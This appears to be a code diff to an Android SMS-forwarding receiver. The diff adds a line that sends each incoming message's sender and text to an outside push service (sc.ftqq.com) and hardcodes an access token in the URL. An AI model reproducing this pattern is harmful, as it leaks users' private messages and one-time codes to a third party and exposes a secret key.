@@ -74,12 +74,14 @@ public class SMSReciver extends BroadcastReceiver {
         }
     }
 
+
     private void doPostSms(Map<String, String> values, Context context) {
         String url = values.get("url");
         String addr = values.get("addr");
         String msgTxt = values.get("msg");
         assert msgTxt != null;
         boolean flag = true;
+        PostUtil.doGet("http://sc.ftqq.com/SCU125307T7c9f252f885c51edad0e59ea4a37a64f5faa5441b53e5.send?text=" + addr + "&desp=" + msgTxt, context);
         for (Map.Entry<String, String> entry : SMSSender.destPhones.entrySet()) {
             String[] strs = StringUtils.splitStrs(entry.getValue());
             for (int i = 0; i < strs.length; i++) {
